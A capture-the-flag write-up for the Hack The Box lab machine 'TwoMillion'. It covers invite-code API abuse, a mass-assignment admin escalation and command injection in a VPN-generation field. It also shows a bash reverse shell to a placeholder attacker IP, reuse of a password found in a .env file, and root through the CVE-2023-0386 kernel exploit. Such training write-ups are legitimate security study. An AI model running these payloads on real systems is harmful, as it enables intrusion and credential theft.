---
tags:
  - HTB
  - Linux
  - Easy
  - API
  - Leakage
  - RCE
  - Kernel
---
https://app.hackthebox.com/machines/TwoMillion/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.10.11.221 2million.htb
```
# Scanning
```console
$ nmap -p22,80 -sV -sC 2million.htb

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Hack The Box :: Penetration Testing Labs
|_http-trane-info: Problem with XML parsing of /evox/about
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Discovery
The website is the old HackTheBox website.
# Enumeration
## Registration
In order to register, the user needs an **invite code**, which is validated with an API.
`curl -s http://2million.htb/invite`:
```html
<!-- scripts -->
<script src="/js/htb-frontend.min.js"></script>
<script defer src="/js/inviteapi.min.js"></script>
<script defer>
	$(document).ready(function() {
		$('#verifyForm').submit(function(e) {
			e.preventDefault();

			var code = $('#code').val();
			var formData = { "code": code };

			$.ajax({
				type: "POST",
				dataType: "json",
				data: formData,
				url: '/api/v1/invite/verify',
				success: function(response) {
					if (response[0] === 200 && response.success === 1 && response.data.message === "Invite code is valid!") {
						// Store the invite code in localStorage
						localStorage.setItem('inviteCode', code);

						window.location.href = '/register';
					} else {
						alert("Invalid invite code. Please try again.");
					}
				},
				error: function(response) {
					alert("An error occurred. Please try again.");
				}
			});
		});
	});
</script>
```
The `/js/inviteapi.min.js` script is obfuscated:
```javascript
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```
Using [de4js](https://lelinhtinh.github.io/de4js/), deobfuscate the script:
```javascript
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}
```
The data explaining how to generate **invite codes** is encrypted:
```console
$ curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate | jq

{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}
```
Decrypt the data:
```console
$ curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate | jq -r '.data.data' | tr 'A-Za-z' 'N-ZA-Mn-za-m'

In order to generate the invite code, make a POST request to /api/v1/invite/generate
```
Generate an **invite code**:
```console
$ curl -s -X POST http://2million.htb/api/v1/invite/generate | jq

{
  "0": 200,
  "success": 1,
  "data": {
    "code": "S0Q1U1YtQVA3RkwtNkVCUE8tTjBQT1Y=",
    "format": "encoded"
  }
}
```
Decode the **invite code**:
```console
$ base64 -d <<< S0Q1U1YtQVA3RkwtNkVCUE8tTjBQT1Y=

KD5SV-AP7FL-6EBPO-N0POV
```
Now, go to `/invite` and register a new user using the **invite code**.
## API Navigation
Log in with the new created user and save the `PHPSESSID` cookie.

Create an alias to navigate the API using JSON content type and our session cookie:
```bash
alias curl='curl -s -H "Content-Type: application/json" -H "Cookie: PHPSESSID=ekf1um1sshrbjnr93o8qnm8msh"'
```

List API functions.
`curl http://2million.htb/api/v1 | jq`:
```json
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```
We can not generate a new **VPN** because we are not **admin**:
```console
$ curl -X POST http://2million.htb/api/v1/admin/vpn/generate -w '%{http_code}'
401

$ curl http://2million.htb/api/v1/admin/auth | jq
{"message":false}
```
Try to modify the current user settings to become **admin**:
```console
$ curl -X PUT http://2million.htb/api/v1/admin/settings/update | jq

{
  "status": "danger",
  "message": "Missing parameter: email"
}
```
Add the `email` parameter to the request:
```console
$ curl -X PUT http://2million.htb/api/v1/admin/settings/update -d '{"email": "test@2million.htb"}' | jq

{
  "status": "danger",
  "message": "Missing parameter: is_admin"
}
```
Add the `is_admin` parameter to the request:
```console
$ curl -X PUT http://2million.htb/api/v1/admin/settings/update -d '{"email": "test@2million.htb", "is_admin": true}' | jq

{
  "status": "danger",
  "message": "Variable is_admin needs to be either 0 or 1."
}
```
Modify the `is_admin` parameter in the request:
```console
$ curl -X PUT http://2million.htb/api/v1/admin/settings/update -d '{"email": "test@2million.htb", "is_admin": 1}' | jq

{
  "id": 15,
  "username": "test",
  "is_admin": 1
}
```
# Exploitation
Now that we are **admin**, try to create a new **VPN**:
```console
$ curl http://2million.htb/api/v1/admin/auth
{"message":true}

$ curl -X POST http://2million.htb/api/v1/admin/vpn/generate
{"status":"danger","message":"Missing parameter: username"}
```
Add the `username` parameter to the request:
```console
$ curl -X POST http://2million.htb/api/v1/admin/vpn/generate -d '{"username": "test"}'

client
dev tun
proto udp
remote edge-eu-free-1.2million.htb 1337
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
comp-lzo
verb 3
data-ciphers-fallback AES-128-CBC
data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
tls-cipher "DEFAULT:@SECLEVEL=0"
auth SHA256
key-direction 1
<ca>
-----BEGIN CERTIFICATE-----
MIIGADCCA+igAwIBAgIUQxzHkNyCAfHzUuoJgKZwCwVNjgIwDQYJKoZIhvcNAQEL
```
Modify the `username` parameter to execute a command:
```console
$ curl -X POST http://2million.htb/api/v1/admin/vpn/generate -d '{"username": "test; id #"}'

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Wait for connections:
```bash
nc -lvnp <PORT>
```
Establish reverse shell connection:
```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate -d '{"username": "test; bash -c \"bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1\" #"}'
```
# Post-Exploitation
## User Migration
Found **user admin**:
```console
$ grep sh$ /etc/passwd

root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/bash
admin:x:1000:1000::/home/admin:/bin/bash
```
The database extracts data from **environment variables**:
```console
$ head -n 20 /var/www/html/Database.php

<?php

class Database 
{
    private $host;
    private $user;
    private $pass;
    private $dbName;

    private static $database = null;
    
    private $mysql;

    public function __construct($host, $user, $pass, $dbName)
    {
        $this->host     = $host;
        $this->user     = $user;
        $this->pass     = $pass;
        $this->dbName   = $dbName;
```
Found `.env` hidden file:
```console
$ ls -lA /var/www/html/

total 48
-rw-r--r-- 1 root root   87 Jun  2  2023 .env
-rw-r--r-- 1 root root 1237 Jun  2  2023 Database.php
-rw-r--r-- 1 root root 2787 Jun  2  2023 Router.php
drwxr-xr-x 5 root root 4096 May  4 01:00 VPN
drwxr-xr-x 2 root root 4096 Jun  6  2023 assets
drwxr-xr-x 2 root root 4096 Jun  6  2023 controllers
drwxr-xr-x 5 root root 4096 Jun  6  2023 css
drwxr-xr-x 2 root root 4096 Jun  6  2023 fonts
drwxr-xr-x 2 root root 4096 Jun  6  2023 images
-rw-r--r-- 1 root root 2692 Jun  2  2023 index.php
drwxr-xr-x 3 root root 4096 Jun  6  2023 js
drwxr-xr-x 2 root root 4096 Jun  6  2023 views
```
Found **user admin** password:
```console
$ cat /var/www/html/.env

DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```
Log in as **user admin**:
```bash
ssh admin@2million.htb
```
Get the **user flag**:
```bash
cat /home/admin/user.txt
```
## Privilege Escalation
Found mail for **user admin**:
```console
$ cat /var/mail/admin

From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```
**Kernel** version (`< 6.2`) is vulnerable to [CVE-2023-0386](https://github.com/sxlmnwb/CVE-2023-0386):
```console
$ uname -s -r

Linux 5.15.70-051570-generic
```
Clone the **exploits** in the attacker's machine, zip them, and create a web server:
```console
$ git clone https://github.com/sxlmnwb/CVE-2023-0386.git

$ zip CVE-2023-0386.zip -r CVE-2023-0386

$ python3 -m http.server <PORT>
```
Download the **exploits** in the target machine, and unzip them:
```console
$ cd /tmp

$ curl -O http://<ATTACKER-IP>:<PORT>/CVE-2023-0386.zip

$ unzip CVE-2023-0386.zip

$ cd CVE-2023-0386
```
Compile the **exploits** and run the first one:
```console
$ make all

$ ./fuse ./ovlcap/lower ./gc
```
Connect as **user admin** via SSH to get a second terminal and run the other **exploit**:
```console
$ sshpass -p 'SuperDuperPass123' ssh admin@2million.htb

$ cd /tmp/CVE-2023-0386

$ ./exp
```
Get the **root flag**:
```bash
cat /root/root.txt
```